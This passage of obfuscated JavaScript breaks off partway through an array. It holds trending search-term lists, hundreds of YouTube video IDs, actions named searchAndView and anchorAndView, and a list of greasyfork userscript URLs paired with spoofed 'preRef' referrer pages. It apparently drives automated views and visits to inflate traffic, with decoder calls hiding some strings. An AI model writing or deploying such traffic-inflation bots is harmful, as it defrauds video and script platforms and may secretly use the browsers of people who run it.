searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x13 * 0x63 + -0xa5c + 0x1 * 0x30d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * 0x18d + -0x69f * -0x3 + -0x1246)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + W(0x11, 'Vwll') + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0x2199 + 0x3b8 + 0x1 * 0x1de4);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    W(0xe, 'HFMa') + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    X(0x1c) + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    W(0x15, 'I0%M') + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    Y(0x14) + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    X(0x1d) + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    W(0xf, '^5*3') + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    X(0xb) + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + X(0x20) + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + Y(0x1e) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
